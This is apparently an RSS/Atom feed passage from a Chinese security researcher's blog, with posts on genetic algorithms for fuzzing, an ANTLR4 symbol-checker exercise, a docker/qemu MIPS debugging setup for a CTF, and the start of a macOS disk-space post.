<p>我们针对没错输入的字符串（个体）进行评估，得到一个评分（适应环境性），这个评分指示着和正确密码的接近程度。算法如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fitness score = (number of char correct) / (total number of char)</span><br></pre></td></tr></table></figure>
<p>随后对输入的串进行变异（进化，进化，进化…），然后对于新一代的群体，进行评分，挑选合适的个体作为第二代，然后从第二代中迭代产生新的个体。</p>
<p>产生下一代的方式也很简单，比如我们有两个个体叫做Tom和Jerry，他们的后代名字的字母就从两者名字字母中取就好了。</p>
<p>经历上述的过程，一代一代的进化，最终一定会得到正确的密码。</p>
<h5 id="2-一点问题"><a href="#2-一点问题" class="headerlink" title="2. 一点问题"></a>2. 一点问题</h5><p>但是问题来了！这也是今天我在看论文时发现的一个问题-。- </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Bloating: </span><br><span class="line">Bloating [16] is a phenomenon that adversely affects input generation in evolutionary computing. </span><br><span class="line">There are two types of bloating: structural and functional bloating.</span><br></pre></td></tr></table></figure>
<p>主要分为两类：Structural Bloating和Functional Bloating。</p>
<p>第一种主要是经过多代的迭代后，经过xx代，个体的平均规模不受控制的增长从而导致代码效率下降，后续的增长也无异于提高适应度（适应度，就是例子中的fitness）。</p>
<p>第二种是指在进化过程中，如果只挑选好的样本（高评分），那么你得到的样本会快速收敛在一个范围内，也就是说，你的样本的特征就趋于一个方向。对于我们这个密码破解程序，当然ok啦，但是对于Fuzz的话显然是不行的，我们需要多种多样的样本而不是趋近于某一种类型的样本。</p>
<h5 id="3-代码"><a href="#3-代码" class="headerlink" title="3. 代码"></a>3. 代码</h5><p>原文作者的代码在这里：<br><a href="https://gist.github.com/NicolleLouis/d4f88d5bd566298d4279bcb69934f51d" target="_blank" rel="noopener">getting-started-genetic-algorithms-python-tutorial_source_code</a></p>
<p>运行结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python3 passwordTuto.py</span><br><span class="line">solution: <span class="string">"banana"</span> de fitness: 100.0</span><br><span class="line">18.69589400291443</span><br></pre></td></tr></table></figure>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/genetic_algorithm/image_GP.png" alt="result"></p>
<h4 id="0x04-一点个人看法"><a href="#0x04-一点个人看法" class="headerlink" title="0x04 : 一点个人看法"></a>0x04 : 一点个人看法</h4><p>我觉得这个算法对于漏洞挖掘，无疑是增强型buff，通过合理的使用，能够有效的提升样本质量，从而提高fuzz的效率。但是文中提到的<code>Bloating</code>的问题，无疑也是需要去考虑然后加以干预的。</p>
<h4 id="0x05-参考及引用"><a href="#0x05-参考及引用" class="headerlink" title="0x05 : 参考及引用"></a>0x05 : 参考及引用</h4><ol>
<li><a href="https://blog.sicara.com/getting-started-genetic-algorithms-python-tutorial-81ffa1dd72f9" target="_blank" rel="noopener">getting-started-genetic-algorithms-python-tutorial</a></li>
<li><a href="https://gist.github.com/NicolleLouis/d4f88d5bd566298d4279bcb69934f51d" target="_blank" rel="noopener">getting-started-genetic-algorithms-python-tutorial_source_code</a></li>
<li>IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00:&quot;&gt;&lt;/a&gt;0x00:&lt;/h4&gt;&lt;p&gt;读Fuzzing相关的paper的时候遇到了关于遗传算法的问题，其实AFL晒样本也是用了遗传算法，个人的话一直没去探究，正好读paper遇到了，就搜了一下，找到了一篇好文 &lt;a href=&quot;https://blog.sicara.com/getting-started-genetic-algorithms-python-tutorial-81ffa1dd72f9&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;getting-started-genetic-algorithms-python-tutorial&lt;/a&gt;，看完之后一下子明了，并且大呼过瘾 (好文章啊!)&lt;/p&gt;
    
    </summary>
    
    
      <category term="Study" scheme="http://o0xmuhe.me/tags/Study/"/>
    
  </entry>
  
  <entry>
    <title>Antlr4初体验</title>
    <link href="http://o0xmuhe.me/2018/05/29/Antlr4%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://o0xmuhe.me/2018/05/29/Antlr4初体验/</id>
    <published>2018-05-29T07:32:36.000Z</published>
    <updated>2018-05-29T08:05:53.798Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00：介绍"><a href="#0x00：介绍" class="headerlink" title="0x00：介绍"></a>0x00：介绍</h4><p>Antlr 4 是一个强大的语法分析器生成工具，可以用来读取、处理、执行和转换结构化文本或二进制文件。通过称为文法的形式化语言描述，ANTLR可以为该语言自动生成词法分析器。生成的语法分析器可以自动构建语法分析树，它是表示文法如何匹配输入的数据结构。ANTLR还可以自动生成树遍历器，用来访问树节点以执行特定的代码。</p>
<a id="more"></a>
<h4 id="0x01-why-this？"><a href="#0x01-why-this？" class="headerlink" title="0x01: why this？"></a>0x01: why this？</h4><p>我一直觉得编译原理相关的东西（理论也好，工具也好）可以和漏洞挖掘发生奇妙的化学反应。和9k师傅聊过相关的东西，有类似想法的人很多。甚至<code>github</code>上六年前的一个项目，使用<code>flex+bison</code>去生成文件来做<code>fuzz</code>。</p>
<p>和<code>flex+bison</code>比较，antlr4无疑是更容易上手，也更加强大的，当然用哪个就是仁者见仁智者见智了。</p>
<p>在深入学习这些东西之后，对domato的思想有了更深刻的理解。其实就是词法分析那套，自顶向下的。不得不说，真的很棒，而且应用范围很广泛，但是效果怎么样我就不知道了，还在摸索。</p>
<h4 id="0x02：-关于本文"><a href="#0x02：-关于本文" class="headerlink" title="0x02： 关于本文"></a>0x02： 关于本文</h4><p>《Antlr4权威指南》中8.4章节练习的学习记录。这部分的例子是一个语法检查器，针对<code>Cymbol</code>语言的。</p>
<p>比如下面的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">float</span> y)</span> </span>&#123;</span><br><span class="line">    g();   <span class="comment">// forward reference is ok</span></span><br><span class="line">    i = <span class="number">3</span>; <span class="comment">// no declaration for i (error)</span></span><br><span class="line">    g = <span class="number">4</span>; <span class="comment">// g is not variable (error)</span></span><br><span class="line">    <span class="keyword">return</span> x + y; <span class="comment">// x, y are defined, so no problem</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">g</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">float</span> y;</span><br><span class="line">    y = <span class="number">9</span>; <span class="comment">// y is defined</span></span><br><span class="line">    f();   <span class="comment">// backward reference is ok</span></span><br><span class="line">    z();   <span class="comment">// no such function (error)</span></span><br><span class="line">    y();   <span class="comment">// y is not function (error)</span></span><br><span class="line">    x = f; <span class="comment">// f is not a variable (error)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经过该语法检查器，可以将一些语法错误找出来，比如未定义的符号、类型引用错误(函数当变量，变量当函数)。</p>
<h4 id="0x03-例子"><a href="#0x03-例子" class="headerlink" title="0x03: 例子"></a>0x03: 例子</h4><h5 id="1-语法分析"><a href="#1-语法分析" class="headerlink" title="1. 语法分析"></a>1. 语法分析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">/** Simple statically-typed programming language with functions and variables</span><br><span class="line"> *  taken from &quot;Language Implementation Patterns&quot; book.</span><br><span class="line"> */</span><br><span class="line">grammar Cymbol;</span><br><span class="line"></span><br><span class="line">file:   (functionDecl | varDecl)+ ;</span><br><span class="line"></span><br><span class="line">varDecl</span><br><span class="line">    :   type ID (&apos;=&apos; expr)? &apos;;&apos;</span><br><span class="line">    ;</span><br><span class="line">type:   &apos;float&apos; | &apos;int&apos; | &apos;void&apos; ; // user-defined types</span><br><span class="line"></span><br><span class="line">functionDecl</span><br><span class="line">    :   type ID &apos;(&apos; formalParameters? &apos;)&apos; block // &quot;void f(int x) &#123;...&#125;&quot;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">formalParameters</span><br><span class="line">    :   formalParameter (&apos;,&apos; formalParameter)*</span><br><span class="line">    ;</span><br><span class="line">formalParameter</span><br><span class="line">    :   type ID</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">block:  &apos;&#123;&apos; stat* &apos;&#125;&apos; ;   // possibly empty statement block</span><br><span class="line"></span><br><span class="line">stat:   block</span><br><span class="line">    |   varDecl</span><br><span class="line">    |   &apos;if&apos; expr &apos;then&apos; stat (&apos;else&apos; stat)?</span><br><span class="line">    |   &apos;return&apos; expr? &apos;;&apos; </span><br><span class="line">    |   expr &apos;=&apos; expr &apos;;&apos; // assignment</span><br><span class="line">    |   expr &apos;;&apos;          // func call</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">/* expr below becomes the following non-left recursive rule:</span><br><span class="line">expr[int _p]</span><br><span class="line">    :   ( &apos;-&apos; expr[6]</span><br><span class="line">        | &apos;!&apos; expr[5]</span><br><span class="line">        | ID</span><br><span class="line">        | INT</span><br><span class="line">        | &apos;(&apos; expr &apos;)&apos;</span><br><span class="line">        )</span><br><span class="line">        ( &#123;8 &gt;= $_p&#125;? &apos;*&apos; expr[9]</span><br><span class="line">        | &#123;7 &gt;= $_p&#125;? (&apos;+&apos;|&apos;-&apos;) expr[8]</span><br><span class="line">        | &#123;4 &gt;= $_p&#125;? &apos;==&apos; expr[5]</span><br><span class="line">        | &#123;10 &gt;= $_p&#125;? &apos;[&apos; expr &apos;]&apos;</span><br><span class="line">        | &#123;9 &gt;= $_p&#125;? &apos;(&apos; exprList? &apos;)&apos;</span><br><span class="line">        )*</span><br><span class="line">    ;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">expr:   ID &apos;(&apos; exprList? &apos;)&apos;    # Call</span><br><span class="line">    |   expr &apos;[&apos; expr &apos;]&apos;       # Index</span><br><span class="line">    |   &apos;-&apos; expr                # Negate</span><br><span class="line">    |   &apos;!&apos; expr                # Not</span><br><span class="line">    |   expr &apos;*&apos; expr           # Mult</span><br><span class="line">    |   expr (&apos;+&apos;|&apos;-&apos;) expr     # AddSub</span><br><span class="line">    |   expr &apos;==&apos; expr          # Equal</span><br><span class="line">    |   ID                      # Var</span><br><span class="line">    |   INT                     # Int</span><br><span class="line">    |   &apos;(&apos; expr &apos;)&apos;            # Parens</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">exprList : expr (&apos;,&apos; expr)* ;   // arg list</span><br><span class="line"></span><br><span class="line">K_FLOAT : &apos;float&apos;;</span><br><span class="line">K_INT   : &apos;int&apos;;</span><br><span class="line">K_VOID  : &apos;void&apos;;</span><br><span class="line">ID  :   LETTER (LETTER | [0-9])* ;</span><br><span class="line">fragment</span><br><span class="line">LETTER : [a-zA-Z] ;</span><br><span class="line"></span><br><span class="line">INT :   [0-9]+ ;</span><br><span class="line"></span><br><span class="line">WS  :   [ \t\n\r]+ -&gt; skip ;</span><br><span class="line"></span><br><span class="line">SL_COMMENT</span><br><span class="line">    :   &apos;//&apos; .*? &apos;\n&apos; -&gt; skip</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure>
<h5 id="2-符号表"><a href="#2-符号表" class="headerlink" title="2. 符号表"></a>2. 符号表</h5><p>这部分是精髓，作者直接拿了自己另一本书里的代码来用，代码不长也好懂。这里我只列一部分比较重要的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseScope</span> <span class="keyword">implements</span> <span class="title">Scope</span> </span>&#123;</span><br><span class="line">    Scope enclosingScope; <span class="comment">// 临近的作用区，如果当前是全局作用域，应该置null</span></span><br><span class="line">                          <span class="comment">// 因为作用域查找是往前找的，全局已经是最靠前了</span></span><br><span class="line">    Map&lt;String, Symbol&gt; symbols = <span class="keyword">new</span> LinkedHashMap&lt;String, Symbol&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BaseScope</span><span class="params">(Scope enclosingScope)</span> </span>&#123; <span class="keyword">this</span>.enclosingScope = enclosingScope;  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Symbol <span class="title">resolve</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        Symbol s = symbols.get(name);</span><br><span class="line">        <span class="keyword">if</span> ( s!=<span class="keyword">null</span> ) <span class="keyword">return</span> s;<span class="comment">//在当前作用域找到了，直接返回</span></span><br><span class="line">        <span class="comment">//如果临近作用域不空，那么就去临近作用域找</span></span><br><span class="line">        <span class="comment">//比如，一个函数内，符号定义没找到，就去往上（全局）找</span></span><br><span class="line">        <span class="keyword">if</span> ( enclosingScope != <span class="keyword">null</span> ) <span class="keyword">return</span> enclosingScope.resolve(name);</span><br><span class="line">        <span class="comment">//还找不到，那就是未定义，报错</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>; <span class="comment">// not found</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">define</span><span class="params">(Symbol sym)</span> </span>&#123;</span><br><span class="line">        symbols.put(sym.name, sym);</span><br><span class="line">        sym.scope = <span class="keyword">this</span>; <span class="comment">// track the scope in each symbol</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Scope <span class="title">getEnclosingScope</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> enclosingScope; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> getScopeName()+<span class="string">":"</span>+symbols.keySet().toString(); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="3-如何检查"><a href="#3-如何检查" class="headerlink" title="3. 如何检查"></a>3. 如何检查</h5><p>因为目标语言<code>Cymbol</code>允许向前引用，比如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    g();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">g</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以需要两次遍历，第一次找到所有定义，并放入符号表，将符号表构造好。<br>接下来进行第二次遍历，这时遇到一个引用，就去找符号表，找到了就是正常，找不到就是有问题。</p>
<h5 id="4-代码"><a href="#4-代码" class="headerlink" title="4. 代码"></a>4. 代码</h5><p>主要是两个文件，<code>DefPhase.java</code>和<code>RefPhase.java</code>。</p>
<h6 id="1-Defphase"><a href="#1-Defphase" class="headerlink" title="1. Defphase"></a>1. Defphase</h6><p>关键的问题：在第一次遍历构造符号表的时候，遇到新的作用域，需要把新的作用域的父作用域设置为当前作用域，并且把新的作用域设置为当前作用域。</p>
<p>对于遇到的变量定义直接使用对应的构造符号表的对象去构造就好了。</p>
<h6 id="2-RefPhase"><a href="#2-RefPhase" class="headerlink" title="2. RefPhase"></a>2. RefPhase</h6><p>遍历检查每个引用部分，去符号表里查找，找不到就报错。这部分比较简单。</p>
<h5 id="3-checkSymbol"><a href="#3-checkSymbol" class="headerlink" title="3. checkSymbol"></a>3. checkSymbol</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">parser.setBuildParseTree(<span class="keyword">true</span>);</span><br><span class="line">ParseTree tree = parser.file();</span><br><span class="line"><span class="comment">// show tree in text form</span></span><br><span class="line"><span class="comment">//System.out.println(tree.toStringTree(parser));</span></span><br><span class="line"></span><br><span class="line">ParseTreeWalker walker = <span class="keyword">new</span> ParseTreeWalker();</span><br><span class="line">DefPhase def = <span class="keyword">new</span> DefPhase();</span><br><span class="line">walker.walk(def, tree);</span><br><span class="line"><span class="comment">// create next phase and feed symbol table info from def to ref phase</span></span><br><span class="line">RefPhase ref = <span class="keyword">new</span> RefPhase(def.globals, def.scopes);</span><br><span class="line">walker.walk(ref, tree);</span><br></pre></td></tr></table></figure>
<h5 id="5-结果"><a href="#5-结果" class="headerlink" title="5. 结果"></a>5. 结果</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:46]</span></span><br><span class="line">$ antlr4 Cymbol.g4</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:49]</span></span><br><span class="line">$ javac Cymbol*.java CheckSymbols.java *Phase.java *Scope.java *Symbol.java -Xlint:deprecation</span><br><span class="line">CheckSymbols.java:9: 警告: [deprecation] org.antlr.v4.runtime中的ANTLRInputStream已过时</span><br><span class="line">import org.antlr.v4.runtime.ANTLRInputStream;</span><br><span class="line">                           ^</span><br><span class="line">CheckSymbols.java:40: 警告: [deprecation] org.antlr.v4.runtime中的ANTLRInputStream已过时</span><br><span class="line">        ANTLRInputStream input = new ANTLRInputStream(is);</span><br><span class="line">        ^</span><br><span class="line">CheckSymbols.java:40: 警告: [deprecation] org.antlr.v4.runtime中的ANTLRInputStream已过时</span><br><span class="line">        ANTLRInputStream input = new ANTLRInputStream(is);</span><br><span class="line">                                     ^</span><br><span class="line">3 个警告</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:56]</span></span><br><span class="line">$ java CheckSymbols vars.cymbol</span><br><span class="line">locals:[]</span><br><span class="line"><span class="keyword">function</span>&lt;f:tINT&gt;:[&lt;x:tINT&gt;, &lt;y:tFLOAT&gt;]</span><br><span class="line">locals:[x, y]</span><br><span class="line"><span class="keyword">function</span>&lt;g:tVOID&gt;:[]</span><br><span class="line">globals:[f, g]</span><br><span class="line">line 3:4 no such variable: i</span><br><span class="line">line 4:4 g is not a variable</span><br><span class="line">line 13:4 no such <span class="keyword">function</span>: z</span><br><span class="line">line 14:4 y is not a <span class="keyword">function</span></span><br><span class="line">line 15:8 f is not a variable</span><br></pre></td></tr></table></figure>
<h4 id="0x04：-引用"><a href="#0x04：-引用" class="headerlink" title="0x04： 引用"></a>0x04： 引用</h4><p>《antlr4权威指南》</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00：介绍&quot;&gt;&lt;a href=&quot;#0x00：介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00：介绍&quot;&gt;&lt;/a&gt;0x00：介绍&lt;/h4&gt;&lt;p&gt;Antlr 4 是一个强大的语法分析器生成工具，可以用来读取、处理、执行和转换结构化文本或二进制文件。通过称为文法的形式化语言描述，ANTLR可以为该语言自动生成词法分析器。生成的语法分析器可以自动构建语法分析树，它是表示文法如何匹配输入的数据结构。ANTLR还可以自动生成树遍历器，用来访问树节点以执行特定的代码。&lt;/p&gt;
    
    </summary>
    
    
      <category term="编译原理" scheme="http://o0xmuhe.me/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
      <category term="Antlr" scheme="http://o0xmuhe.me/tags/Antlr/"/>
    
  </entry>
  
  <entry>
    <title>mips程序调试环境折腾</title>
    <link href="http://o0xmuhe.me/2018/04/19/mips%E7%A8%8B%E5%BA%8F%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%8A%98%E8%85%BE/"/>
    <id>http://o0xmuhe.me/2018/04/19/mips程序调试环境折腾/</id>
    <published>2018-04-18T18:56:38.000Z</published>
    <updated>2018-04-19T06:25:55.429Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 : 起因"></a>0x00 : 起因</h4><p>比赛遇到了，帮学弟折腾调试环境，中间踩坑无数，但是最后还是解决了，就记录下。</p>
<a id="more"></a>
<h4 id="0x01-最初尝试"><a href="#0x01-最初尝试" class="headerlink" title="0x01 : 最初尝试"></a>0x01 : 最初尝试</h4><p>最初尝试在Linux虚拟机里，qemu + gdbserver的搞事情，但是，依赖问题太闹心了，各种交叉编译的蛋疼事情。</p>
<p>所以就放弃了。</p>
<h4 id="0x02-docker专治环境搭建"><a href="#0x02-docker专治环境搭建" class="headerlink" title="0x02 : docker专治环境搭建"></a>0x02 : docker专治环境搭建</h4><p>后来想了想，我为啥不用docker神器，肯定有人和我一样不想弄交叉编译环境，所以肯定搞了这样的镜像～</p>
<p>Google搜索一大堆之后：</p>
<ol>
<li><p><a href="https://hub.docker.com/r/skysider/multiarch-docker/" target="_blank" rel="noopener">multiarch-docker</a></p>
</li>
<li><p><a href="https://hub.docker.com/r/blukat29/cross/" target="_blank" rel="noopener">cross</a></p>
</li>
</ol>
<p>这两个还不错，我选择了第一个来使用。</p>
<h4 id="0x03-使用过程"><a href="#0x03-使用过程" class="headerlink" title="0x03 : 使用过程"></a>0x03 : 使用过程</h4><h5 id="1-获取所需镜像"><a href="#1-获取所需镜像" class="headerlink" title="1. 获取所需镜像"></a>1. 获取所需镜像</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull skysider/multiarch-docker</span><br></pre></td></tr></table></figure>
<h5 id="2-启动"><a href="#2-启动" class="headerlink" title="2. 启动"></a>2. 启动</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -it \</span><br><span class="line">    --rm \</span><br><span class="line">    -h baby_mips \</span><br><span class="line">    --name baby_mips \</span><br><span class="line">    -v $(<span class="built_in">pwd</span>):/ctf/work \</span><br><span class="line">    -P \</span><br><span class="line">    --cap-add=SYS_PTRACE \</span><br><span class="line">    skysider/multiarch-docker</span><br></pre></td></tr></table></figure>
<h5 id="3-复制文件"><a href="#3-复制文件" class="headerlink" title="3. 复制文件"></a>3. 复制文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker cp ~/Downloads/baby_mips.dms 207187a8a24d:/tmp/</span><br></pre></td></tr></table></figure>
<h5 id="4-调试"><a href="#4-调试" class="headerlink" title="4. 调试"></a>4. 调试</h5><p>这里需要开两个bash，在启动容器的时候已经有一个bahs了，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps <span class="_">-a</span></span><br></pre></td></tr></table></figure>
<p>看看当前这个容器的id，然后：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it id /bin/bash</span><br></pre></td></tr></table></figure>
<p>得到两个bash，一个运行程序，一个gdb窗口。</p>
<p>运行程序：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -g 2333 ./demo</span><br></pre></td></tr></table></figure>
<p>gdb调试端口是2333</p>
<p>gdb窗口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./demo</span><br></pre></td></tr></table></figure>
<p>然后gdb里</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote localhost:2333</span><br></pre></td></tr></table></figure>
<p>gdb里好像不用set arch了，pwngdb插件自动识别了好像 囧</p>
<h5 id="5-have-fun"><a href="#5-have-fun" class="headerlink" title="5. have fun"></a>5. have fun</h5><p>Enjoy your debug journey~</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-起因&quot;&gt;&lt;a href=&quot;#0x00-起因&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 起因&quot;&gt;&lt;/a&gt;0x00 : 起因&lt;/h4&gt;&lt;p&gt;比赛遇到了，帮学弟折腾调试环境，中间踩坑无数，但是最后还是解决了，就记录下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="debug" scheme="http://o0xmuhe.me/tags/debug/"/>
    
      <category term="mips" scheme="http://o0xmuhe.me/tags/mips/"/>
    
  </entry>
  
  <entry>
    <title>拯救macOS High sierra的硬盘空间</title>
    <link href="http://o0xmuhe.me/2018/03/14/%E6%8B%AF%E6%95%91macOS-High-sierra%E7%9A%84%E7%A1%AC%E7%9B%98%E7%A9%BA%E9%97%B4/"/>
    <id>http://o0xmuhe.me/2018/03/14/拯救macOS-High-sierra的硬盘空间/</id>
    <published>2018-03-14T09:03:06.000Z</published>
    <updated>2018-03-14T09:14:21.355Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 : 起因"></a>0x00 : 起因</h4><p>Mac一直开着time machine备份数据，一直没出啥问题。<br>直到今天在工作的时候，原本clone的一个虚拟机有问题，我就删了，重新克隆。(没有快照真的尴尬了)</p>
<a id="more"></a>
<p>结果发现克隆不了，提示我硬盘空间不足。 :(<br>我看了下本机的硬盘，明明还有120g+呢，怎么会不足呢。</p>
